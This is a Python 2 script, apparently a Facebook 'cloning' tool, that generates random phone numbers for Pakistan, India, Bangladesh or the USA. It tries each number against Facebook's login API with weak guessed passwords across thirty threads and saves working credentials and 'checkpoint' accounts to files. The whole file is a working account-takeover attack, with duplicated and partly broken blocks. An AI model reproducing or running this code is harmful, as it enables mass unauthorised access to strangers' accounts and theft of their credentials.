#!/usr/bin/python
# coding=utf-8
# Originally Written By:Muhammad Hamza
# Source : Python2"
# Donot Recode It. 

#Import module


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(2000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print(nmbr)
    sys.stdout.flush()

try:
	import requests
except ImportError:
	os.system("pip2 install tqdm")
try:    
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('pip2 install tqdm')

#Browser Setting
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

from tqdm import tqdm
def load():
	with tqdm(total=100, desc="Loading ",bar_format="{l_bar}{bar}") as pbar:
		for i in range(100):
			time.sleep(0.030)
			pbar.update(1)
##### LOGO #####
banner = """
╔╗─╔╗╔═══╗╔═╗╔═╗╔════╗╔═══╗
║║─║║║╔═╗║║║╚╝║║╚══╗═║║╔═╗║
║╚═╝║║║─║║║╔╗╔╗║──╔╝╔╝║║─║║
║╔═╗║║╚═╝║║║║║║║─╔╝╔╝─║╚═╝║
║║─║║║╔═╗║║║║║║║╔╝═╚═╗║╔═╗║
╚╝─╚╝╚╝─╚╝╚╝╚╝╚╝╚════╝╚╝─╚╝
-----------------------------------------------

➣ Coder   : Muhammad Hamza
➣ Github  : https://github.com/Hamzahash
➣ Facebook: Muhammad Hamza
➣ Youtube : HOP Anonymous

-----------------------------------------------"""
back = 0
threads = []
successful = []
checkpoint = []
oks = []
gagal = []
idh = []
id = []

def crack_no():
    os.system('clear')
    print banner
    print
    print "[1] Clone From Pakistan"
    print "[2] Clone From India"
    print "[3] Clone From Bangladesh"
    print "[4] Clone From USA"
    print "[0] Back To Main Menu"
    print
    crack_no_action()
def crack_no_action():
    no = raw_input('Choose Country >>> ')
    if no =="":
        print "Wrong Input"
        time.sleep(1)
        crack_no_action()
    elif no =="1":
        pakistan()
    elif no =="2":
        india()
    elif no =="3":
        bangladesh()
    elif no =="4":
        usa()
    elif no =="0":
        os.system('python2 .hop2.py')
    else:
        print "Wrong Input"
        time.sleep(1)
        crack_no_action()
def pakistan():
	os.system("clear")
	print banner
	print 
	try:
		c = raw_input("[+] Enter 3 Digits Code : ")
		exit('[!] Code Must Be 3 Digit ') if len(c) < 3 else ''
		k="0"
		idlist = ('.txt')
		for line in open(idlist,"r").readlines():
			id.append(line.strip())
	except IOError:
		print ("[!] File Not Found")
		raw_input("\n[Press Enter To Back] ")
		crack_no()

	xxx = str(len(id))
	hamza ('\033[1;97m[\033[1;97m✓\033[1;97m]\033[1;97m Total Number \033[1;97m:\033[1;97m '+xxx)
	time.sleep(0.5)
	hamza ('[✓] The Process Has Started')
	time.sleep(0.5)
	hamza ('\033[1;97m[\033[1;97m!\033[1;97m] \033[1;97mPress CTRL Z To Stop')
	time.sleep(0.5)
	print (47*"-")
	
#### MAIN PAKISTAN ####
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
				oka = open('save/pakistan.txt', 'a')
				oka.write("[Successful]" +k+c+user+" | "+pass1+"\n")
				oka.close()
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					cps = open('save/pakistan.txt', 'a')
					cps.write("[Checkpoint] " +k+c+user+" | "+pass1+"\n")
					cps.close()
					checkpoint.append(user+pass1)
				else:
					pass2 = '786786'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
						oka = open('save/pakistan.txt', 'a')
						oka.write("[Successful] " +k+c+user+" | "+pass2+"\n")
						oka.close()
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
							cps = open('save/pakistan.txt', 'a')
							cps.write("[Checkpoint] " +k+c+user+" | "+pass2+"\n")
							cps.close()
							checkpoint.append(user+pass2)
						else:
							pass3 = 'Pakistan'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass3
								oka = open('save/pakistan.txt', 'a')
								oka.write("[Checkpoint] " +k+c+user+" | "+pass3+"\n")
								oka.close()
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
									cps = open('save/pakistan.txt', 'a')
									cps.write("[Checkpoint] " +k+c+user+" | "+pass3+"\n")
									cps.close()
									checkpoint.append(user+pass3)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	crack_no()	
	
def india():
	os.system("clear")
	print banner
	print
	print("Useful Codes : 755 855 935 965 975 995")
	print 
	try:
		c = raw_input("[+] Enter 3 Digits Code : ")
		exit('[!] Code Must Be 3 Digit ') if len(c) < 3 else ''
		k="+91"
		idlist = ('.txt')
		for line in open(idlist,"r").readlines():
			id.append(line.strip())
	except IOError:
		print ("[!] File Not Found")
		raw_input("\n[Press Enter To Back] ")
		crack_no()

	xxx = str(len(id))
	hamza ('\033[1;97m[\033[1;97m✓\033[1;97m]\033[1;97m Total Number \033[1;97m:\033[1;97m '+xxx)
	time.sleep(0.5)
	hamza ('[✓] The Process Has Started')
	time.sleep(0.5)
	hamza ('\033[1;97m[\033[1;97m!\033[1;97m] \033[1;97mPress CTRL Z To Stop')
	time.sleep(0.5)
	print (47*"-")
	
#### MAIN India ####
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
				oka = open('save/india.txt', 'a')
				oka.write("[Successful]" +k+c+user+" | "+pass1+"\n")
				oka.close()
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					cps = open('save/india.txt', 'a')
					cps.write("[Checkpoint] " +k+c+user+" | "+pass1+"\n")
					cps.close()
					checkpoint.append(user+pass1)

																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	crack_no()	
	
def bangladesh():
	os.system("clear")
	print banner
	print
	print "Useful Codes : 191 To 199"
	try:
		c = raw_input("[+] Enter 3 Digits Code : ")
		exit('[!] Code Must Be 3 Digit ') if len(c) < 3 else ''
		k="+880"
		idlist = ('.txt')
		for line in open(idlist,"r").readlines():
			id.append(line.strip())
	except IOError:
		print ("[!] File Not Found")
		raw_input("\n[Press Enter To Back] ")
		crack_no()

	xxx = str(len(id))
	hamza ('\033[1;97m[\033[1;97m✓\033[1;97m]\033[1;97m Total Number \033[1;97m:\033[1;97m '+xxx)
	time.sleep(0.5)
	hamza ('[✓] The Process Has Started')
	time.sleep(0.5)
	hamza ('\033[1;97m[\033[1;97m!\033[1;97m] \033[1;97mPress CTRL Z To Stop')
	time.sleep(0.5)
	print (47*"-")
	
#### MAIN Bangladesh ####
	def main(arg):
		global checkpoint,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
				oka = open('save/bang.txt', 'a')
				oka.write("[Successful]" +k+c+user+" | "+pass1+"\n")
				oka.close()
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					cps = open('save/bangla.txt', 'a')
					cps.write("[Checkpoint] " +k+c+user+" | "+pass1+"\n")
					cps.close()
					checkpoint.append(user+pass1)
				else:
					pass2 = 'allah786'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
						oka = open('save/bang.txt', 'a')
						oka.write("[Successful] " +k+c+user+" | "+pass2+"\n")
						oka.close()
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
							cps = open('save/bang.txt', 'a')
							cps.write("[Checkpoint] " +k+c+user+" | "+pass2+"\n")
							cps.close()
							checkpoint.append(user+pass2)
						else:
							pass3 = 'Pakistan'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
								oka = open('save/bang.txt', 'a')
								oka.write("[Successful] " +k+c+user+" | "+pass3+"\n")
								oka.close()
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
									cps = open('save/pakistan.txt', 'a')
									cps.write("[Checkpoint] " +k+c+user+" | "+pass3+"\n")
									cps.close()
									checkpoint.append(user+pass3)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	crack_no()	
	

	print("Useful Codes : 755 855 935 965 975 995")
	print 
	try:
		c = raw_input("[+] Enter 3 Digits Code : ")
		exit('[!] Code Must Be 3 Digit ') if len(c) < 3 else ''
		k="+91"
		idlist = ('.txt')
		for line in open(idlist,"r").readlines():
			id.append(line.strip())
	except IOError:
		print ("[!] File Not Found")
		raw_input("\n[Press Enter To Back] ")
		crack_no()

	xxx = str(len(id))
	hamza ('\033[1;97m[\033[1;97m✓\033[1;97m]\033[1;97m Total Number \033[1;97m:\033[1;97m '+xxx)
	time.sleep(0.5)
	hamza ('[✓] The Process Has Started')
	time.sleep(0.5)
	hamza ('\033[1;97m[\033[1;97m!\033[1;97m] \033[1;97mPress CTRL Z To Stop')
	time.sleep(0.5)
	print (47*"-")
	
#### MAIN India ####
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
				oka = open('save/india.txt', 'a')
				oka.write("[Successful]" +k+c+user+" | "+pass1+"\n")
				oka.close()
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					cps = open('save/india.txt', 'a')
					cps.write("[Checkpoint] " +k+c+user+" | "+pass1+"\n")
					cps.close()
					checkpoint.append(user+pass1)

																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	crack_no()	
	
def bangladesh():
	os.system("clear")
	print banner
	print
	print "Useful Codes : 191 To 199"
	try:
		c = raw_input("[+] Enter 3 Digits Code : ")
		exit('[!] Code Must Be 3 Digit ') if len(c) < 3 else ''
		k="+880"
		idlist = ('.txt')
		for line in open(idlist,"r").readlines():
			id.append(line.strip())
	except IOError:
		print ("[!] File Not Found")
		raw_input("\n[Press Enter To Back] ")
		crack_no()

	xxx = str(len(id))
	hamza ('\033[1;97m[\033[1;97m✓\033[1;97m]\033[1;97m Total Number \033[1;97m:\033[1;97m '+xxx)
	time.sleep(0.5)
	hamza ('[✓] The Process Has Started')
	time.sleep(0.5)
	hamza ('\033[1;97m[\033[1;97m!\033[1;97m] \033[1;97mPress CTRL Z To Stop')
	time.sleep(0.5)
	print (47*"-")
	
#### MAIN Bangladesh ####
	def main(arg):
		global checkpoint,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
				oka = open('save/bang.txt', 'a')
				oka.write("[Successful]" +k+c+user+" | "+pass1+"\n")
				oka.close()
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					cps = open('save/bangla.txt', 'a')
					cps.write("[Checkpoint] " +k+c+user+" | "+pass1+"\n")
					cps.close()
					checkpoint.append(user+pass1)
				else:
					pass2 = 'allah786'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
						oka = open('save/bang.txt', 'a')
						oka.write("[Successful] " +k+c+user+" | "+pass2+"\n")
						oka.close()
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
							cps = open('save/bang.txt', 'a')
							cps.write("[Checkpoint] " +k+c+user+" | "+pass2+"\n")
							cps.close()
							checkpoint.append(user+pass2)
						else:
							pass3 = 'Pakistan'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
								oka = open('save/bang.txt', 'a')
								oka.write("[Successful] " +k+c+user+" | "+pass3+"\n")
								oka.close()
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
									cps = open('save/pakistan.txt', 'a')
									cps.write("[Checkpoint] " +k+c+user+" | "+pass3+"\n")
									cps.close()
									checkpoint.append(user+pass3)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	crack_no()	

def usa():
	os.system("clear")
	print banner
	print
	print("Search On Google For USA Area Codes")
	print 
	try:
		c = raw_input("[+] Enter 3 Digits Code : ")
		exit('[!] Code Must Be 3 Digit ') if len(c) < 3 else ''
		k="+1"
		idlist = ('.txt')
		for line in open(idlist,"r").readlines():
			id.append(line.strip())
	except IOError:
		print ("[!] File Not Found")
		raw_input("\n[Press Enter To Back] ")
		crack_no()

	xxx = str(len(id))
	hamza ('\033[1;97m[\033[1;97m✓\033[1;97m]\033[1;97m Total Number \033[1;97m:\033[1;97m '+xxx)
	time.sleep(0.5)
	hamza ('[✓] The Process Has Started')
	time.sleep(0.5)
	hamza ('\033[1;97m[\033[1;97m!\033[1;97m] \033[1;97mPress CTRL Z To Stop')
	time.sleep(0.5)
	print (47*"-")
	
#### MAIN India ####
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
				oka = open('save/india.txt', 'a')
				oka.write("[Successful]" +k+c+user+" | "+pass1+"\n")
				oka.close()
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
					cps = open('save/india.txt', 'a')
					cps.write("[Checkpoint] " +k+c+user+" | "+pass1+"\n")
					cps.close()
					checkpoint.append(user+pass1)

																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	crack_no()	
	
if __name__ == '__main__':
	crack_no()

